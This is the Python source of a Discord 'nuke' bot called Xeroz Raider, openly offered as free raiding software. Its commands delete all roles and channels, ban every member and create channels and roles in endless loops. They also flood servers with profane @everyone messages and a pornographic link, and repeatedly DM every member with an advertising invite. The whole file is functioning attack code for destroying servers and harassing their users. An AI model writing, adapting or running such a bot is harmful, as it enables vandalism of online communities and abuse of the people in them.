import discord
import asyncio
import random
from discord.ext import commands
import colorama
from colorama import init, Fore
from asyncio import sleep

TOKEN = (str)(input("Send me token bot: "))
PREFIX = (input("Send me PREFIX of your bot: "))
 # EMBED SPAM
channel_make = 20000
SERVER_NAME = "Xeroz Raider"
bot = commands.Bot(command_prefix={PREFIX}, help_command=None, intents=discord.Intents.all())
# EMBES AND MORE
eme = discord.Embed(
  title = 'Xeroz Raider',
  description = 'THE SERVER HAS BEEN RAIDED BY THE RAIDER XEROZ! ¡Free software!'
)
ems = discord.Embed(title="¡THIS SERVER HAS BEEN RAIDED!", url="https://discord.gg/AAmDgKP9BU", description="RAIDED BY XerozRaider!", color=0xffb3b3)
ems.set_author(name="Xeroz Raider", url="https://discord.gg/AAmDgKP9BU", icon_url="https://cdn.discordapp.com/emojis/1033852930618576896.webp?size=96&quality=lossless")
ems.set_thumbnail(url="https://cdn.discordapp.com/attachments/1027661729687154808/1033925526085181470/zero2.jpg_172596871.jpg")
ems.add_field(name=":key: SERVER RAIDED", value=":recycle: BY XEROZ RAIDER [FREE]", inline=True)
ems.add_field(name=":ghost: SERVER PWNED!!!", value="FUCKEED", inline=False)
ems.set_footer(text="Xeroz Raider")

helpm = f"""

⋅  ────────────── ✧  ────────────── ⋅
     ━━ {Fore.GREEN}{PREFIX}coffe {Fore.LIGHTRED_EX}(Destroy All Server)
     ━━ {Fore.GREEN}{PREFIX}dm    {Fore.LIGHTRED_EX}(DM ALL SPAM)
     ━━ {Fore.GREEN}{PREFIX}roles  {Fore.LIGHTRED_EX}(DELETE ALL ROLES)
     ━━ {Fore.GREEN}{PREFIX}croles {Fore.LIGHTGREEN_EX}(CREATE ROLES MASSIVE)
     ━━ {Fore.GREEN}{PREFIX}banall {Fore.LIGHTRED_EX}(Ban all Lol)
     ━━ {Fore.GREEN}{PREFIX}spam {Fore.LIGHTRED_EX}(Spam lmao)
⋅  ────────────── ✧  ────────────── ⋅


"""
#Nuke!

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Help Menu!")
    embed.set_author(name="Xeroz Raid", icon_url="https://cdn.discordapp.com/emojis/1017018790808137748.webp?size=96&quality=lossless")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1034504355728072704/1034506184360726598/0797a015e8fd89901c76b0c31ed8a576.jpg")
    embed.set_footer(text="Xeroz Raider", icon_url="https://cdn.discordapp.com/emojis/889490924009304074.webp?size=96&quality=lossless")
    embed.add_field(name=":coffee: coffe", value="create channels + spam", inline=True)
    embed.add_field(name=":space_invader: banall", value="For ban all members!", inline=True)
    embed.add_field(name=":dash: spam", value="For spam in current channel!", inline=True)
    embed.add_field(name=":zap: roles", value="Delete all roles!", inline=True)
    embed.add_field(name=":boom: croles", value="Create infinity roles spam!", inline=True)
    embed.add_field(name=":skull: rchannel", value="Delete all channels!", inline=True)
    embed.add_field(name=":key: dm", value="DMALL spam!", inline=True)
    await ctx.send(embed=embed)
@bot.command()
async def coffe(ctx):
    for channel in range(1, 40):
        await ctx.guild.create_text_channel("Xeroz Raid")
        guild = ctx.guild.channels[channel]
        await guild.send(embed=ems)
        await guild.send("@everyone SHIT SERVER FUCKED")
@bot.command()
async def croles(ctx):
    guild = ctx.guild
    while True:
        await guild.create_role(name="Xeroz Raider!")
@bot.command()
async def roles(ctx):
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{r} {Fore.BLUE} has been deleted!")
        except:
                print(f"{Fore.LIGHTRED_EX}Cannot delete {Fore.CYAN} {r.name}")
@bot.command()
async def rchannel(ctx):
    for c in ctx.guild.channels:
        await c.delete()
        print("Deleting channels", c)
@bot.command()
async def banall(ctx, amount=2):
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass
        await ctx.send("Yeaaahh, all members has been banned!")
        await ctx.channel.purge(limit=amount)

@bot.command()
# DM ALL
async def dm(ctx):
    guild = ctx.message.guild
    for member in guild.members:
        await asyncio.sleep(0)
        try:
            x = 0
            while x<10:
              await member.send(embed=eme)
              await member.send("https://discord.gg/AAmDgKP9BU")
              x = x + 1
            #await ctx.send("Sent message")
        except:
             await ctx.send("SERVER HAS BEEN FUCKED BY XEROZ RAIDER @everyone")
@bot.command()
async def spam(ctx):
    leng = 30
    for i in range (leng):
        embed=discord.Embed(title="¡THIS SERVER HAS BEEN RAIDED!", url="https://discord.gg/AAmDgKP9BU", description="RAIDED BY XerozRaider!", color=0xffb3b3)
        embed.set_author(name="Xeroz Raider", url="https://discord.gg/AAmDgKP9BU", icon_url="https://cdn.discordapp.com/emojis/1033852930618576896.webp?size=96&quality=lossless")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1027661729687154808/1033925526085181470/zero2.jpg_172596871.jpg")
        embed.add_field(name=":key: SERVER RAIDED", value=":recycle: BY XEROZ RAIDER [FREE SOFTWARE]", inline=True)
        embed.add_field(name=":ghost: SERVER PWNED!!!", value="FUCKEEED", inline=False)
        embed.set_footer(text="Xeroz Raider")
        await ctx.send("@everyone get fucked discord.gg/pornhub")
        await ctx.send(embed=embed)
@bot.event
async def on_ready():
    print(helpm)


bot.run(TOKEN)